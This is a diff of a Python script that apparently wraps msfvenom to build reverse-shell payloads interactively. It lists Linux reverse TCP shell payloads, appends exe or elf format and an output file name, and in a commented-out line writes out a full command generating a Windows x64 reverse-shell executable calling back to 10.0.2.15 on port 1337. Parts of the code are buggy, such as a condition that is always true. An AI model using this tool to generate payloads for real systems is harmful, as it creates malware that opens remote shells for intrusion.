@@ -10,6 +10,8 @@ import socket
 pastPackets = ()
 baseSearch = ("msfvenom -l payloads |")
 finalPacket = ("msfvenom -p ")
+program_call = 'msfvenom'
+arg_one = '-p'
 
 
 #allowable commands
@@ -96,9 +98,8 @@ def createPayload():
   print(Fore.GREEN + "linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell")
   print("linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6")
   print()
-  OS = input(Fore.WHITE + "Command Line: ")
-  finalPacket += OS
-  if OS == "REDO":
+  arg_two = input(Fore.WHITE + "Command Line: ")
+  if arg_two == "REDO":
     createPayload()
 
 def  Lportnhost():
@@ -151,7 +152,7 @@ def  Lportnhost():
       finalPacket += ( " -f exe")
       target = 0
 
-    if typeOfMachine == "linux" or "Linux":
+    elif typeOfMachine == "linux" or "Linux":
       finalPacket += ( " -f elf")
       target = 0
       
@@ -170,7 +171,7 @@ def finlization():
   print()
   OS = input(Fore.WHITE + "Command Line: ")
   namePacket = OS
-  finalPacket += ( " " + str(namePacket))
+  finalPacket += ( " -o " + str(namePacket))
 
  
 
@@ -185,8 +186,10 @@ Lportnhost()
 finlization()
 os.system('cls' if os.name == 'nt' else "printf '\033c'")
 print(Fore.GREEN + finalPacket)
-packet_call = str("'"+str(finalPacket.replace(" ","','"))+"'")
-return_code = subprocess.call(packet_call)
-print("output:", return_code)
-
+# packet_call = str("'"+str(finalPacket.replace(" ","','"))+"'")
+# # print (packet_call)
+# return_code = subprocess.call([packet_call])
+# print("output:", return_code)
+# # return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
+# # print("output:", return_code)
 
